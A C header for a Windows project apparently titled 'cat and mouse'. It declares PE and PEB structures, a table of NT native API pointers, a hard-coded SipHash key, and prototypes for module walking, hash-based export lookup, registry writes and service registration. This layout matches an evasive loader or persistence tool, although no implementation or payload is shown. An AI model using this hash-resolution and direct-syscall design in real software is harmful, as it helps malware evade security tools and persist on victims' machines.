//
// Created by mikul on 05.01.2026.
//

#ifndef CAT_AND_MOUSE_NTLIB_H
#define CAT_AND_MOUSE_NTLIB_H
#pragma once

#include <intrin.h>
#include "inttypes.h"

static const uint8_t key[16] = {0x44, 0x61, 0x72, 0x6b, 0x65, 0x73, 0x74, 0x44, 0x75, 0x6e, 0x67, 0x65, 0x6f, 0x6e, 0x49, 0x49};
#ifndef _WINDOWS_
typedef void *HANDLE;
typedef void *PVOID;
typedef void * HMODULE;
typedef unsigned long ULONG;
typedef unsigned long DWORD;
typedef unsigned short USHORT;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef long NTSTATUS;
typedef wchar_t WCHAR;
typedef const WCHAR *PCWSTR;
typedef WCHAR *PWSTR;
typedef unsigned __int64 ULONG_PTR;

#define REG_NONE (0)
#define REG_SZ (1)
#define REG_EXPAND_SZ (2)
#define REG_BINARY (3)
#define REG_DWORD (4)
#define REG_DWORD_LITTLE_ENDIAN (4)
#define REG_DWORD_BIG_ENDIAN (5)
#define REG_LINK (6)
#define REG_MULTI_SZ (7)
#define REG_RESOURCE_LIST (8)
#define REG_FULL_RESOURCE_DESCRIPTOR (9)
#define REG_RESOURCE_REQUIREMENTS_LIST (10)
#define REG_QWORD (11)
#define REG_QWORD_LITTLE_ENDIAN (11)

#define NTAPI __stdcall
#define _In_
#define _Out_
#define _In_opt_
#define _Out_opt_
#define _Inout_
#define IMAGE_DOS_SIGNATURE 0x5A4D     // "MZ"
#define IMAGE_NT_SIGNATURE  0x00004550 // "PE\0\0"
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0

typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip;
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    long e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_FILE_HEADER {
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD Magic;
    BYTE MajorLinkerVersion;
    BYTE MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    unsigned __int64 ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD MajorOperatingSystemVersion;
    WORD MinorOperatingSystemVersion;
    WORD MajorImageVersion;
    WORD MinorImageVersion;
    WORD MajorSubsystemVersion;
    WORD MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD Subsystem;
    WORD DllCharacteristics;
    unsigned __int64 SizeOfStackReserve;
    unsigned __int64 SizeOfStackCommit;
    unsigned __int64 SizeOfHeapReserve;
    unsigned __int64 SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD MajorVersion;
    WORD MinorVersion;
    DWORD Name;
    DWORD Base;
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _UNICODE_STRING {
    unsigned short Length;
    unsigned short MaximumLength;
    wchar_t *Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

#define CONTAINING_RECORD(address, type, field) ((type *)( \
(char *)(address) - \
(unsigned __int64)(&((type *)0)->field)))

typedef struct _PEB_LDR_DATA {
    unsigned int Length;
    unsigned char Initialized;
    void *SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _SERVICE_STATUS {
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
} SERVICE_STATUS,*LPSERVICE_STATUS;

typedef struct _PEB {
    unsigned char InheritedAddressSpace;
    unsigned char ReadImageFileExecOptions;
    unsigned char BeingDebugged;
    unsigned char BitField;
    void *Mutant;
    void *ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION
{
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataLength;
    unsigned char Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,           // 0
    KeyValueFullInformation,            // 1
    KeyValuePartialInformation,         // 2 (This is the one we want)
    KeyValueFullInformationAlign64,     // 3
    KeyValuePartialInformationAlign64,  // 4
    KeyValueLayerInformation,           // 5
    KeyValueLastWriteTimeInformation,   // 6
    KeyValueSetExecutionRoleInformation,// 7
    MaxKeyValueInfoClass                // 8
} KEY_VALUE_INFORMATION_CLASS;


typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#endif
#define InitializeObjectAttributes(p, n, a, r, s) { \
(p)->Length = sizeof(OBJECT_ATTRIBUTES);          \
(p)->RootDirectory = r;                           \
(p)->Attributes = a;                              \
(p)->ObjectName = n;                              \
(p)->SecurityDescriptor = s;                      \
(p)->SecurityQualityOfService = NULL;             \
}


typedef NTSTATUS (NTAPI *pNtCreateKey)(HANDLE *, ULONG, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, ULONG *);

typedef NTSTATUS (NTAPI *pNtOpenKey)(HANDLE *, ULONG, POBJECT_ATTRIBUTES);

typedef NTSTATUS (NTAPI *pNtSetValueKey)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);

typedef NTSTATUS (NTAPI *pNtCreateFile)(HANDLE *, ULONG, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, void *, ULONG, ULONG,
                                        ULONG, ULONG, void *, ULONG);

typedef NTSTATUS (NTAPI *pNtWriteFile)(HANDLE, HANDLE, void *, void *, PIO_STATUS_BLOCK, void *, ULONG, void *, void *);

typedef NTSTATUS (NTAPI *pRtlDecompressBuffer)(USHORT, BYTE *, ULONG, BYTE *, ULONG, ULONG *);

typedef NTSTATUS (NTAPI *pNtQueryValueKey) (HANDLE , UNICODE_STRING *, KEY_VALUE_INFORMATION_CLASS, void *, ULONG Length, unsigned long * ResultLength);

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE ProcessHandle,PVOID *BaseAddress, ULONG_PTR ZeroBits, size_t * RegionSize, ULONG AllocationType, ULONG PageProtection);

typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory) (HANDLE ProcessHandle, PVOID *BaseAddress, size_t *  RegionSize, ULONG FreeType);

typedef void (* pRtlCopyMemory) (void * destination, const void * source, size_t size);

typedef struct _API_TABLE {
    pNtCreateKey NtCreateKey;
    pNtOpenKey NtOpenKey;
    pNtSetValueKey NtSetValueKey;
    pNtQueryValueKey NtQueryValueKey;
    pNtClose NtClose;
    pNtCreateFile NtCreateFile;
    pNtWriteFile NtWriteFile;
    pRtlDecompressBuffer RtlDecompressBuffer;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtFreeVirtualMemory NtFreeVirtualMemory;
    pRtlCopyMemory RtlCopyMemory;
} API_TABLE;


uint64_t siphash24(const void *src, size_t len, const uint8_t key[16]);

HMODULE GetLibraryBase(const wchar_t *);

void *GetProcAddressByHash(HMODULE hModule, unsigned long long targetHash);

void ArchiveNativeAPIs(HMODULE hNtdll, API_TABLE *);

HANDLE CreateRegistryKey(PCWSTR path, API_TABLE *);

void * QueryRegistryKey(HANDLE, PCWSTR path, PCWSTR name, API_TABLE *);

HANDLE OpenRegistryKey(PCWSTR path, API_TABLE *api);

NTSTATUS freeMemory(API_TABLE * api, void * location);

void * allocateMemory(API_TABLE * api, size_t size);

int RegisterService(API_TABLE *);

NTSTATUS SetRegistryKeyValue(HANDLE keyHandle, PCWSTR name, unsigned long type, void *value, unsigned long dataSize,
                             API_TABLE *);

HANDLE CreateFileNt();

void WriteFileNt();


#endif //CAT_AND_MOUSE_NTLIB_H
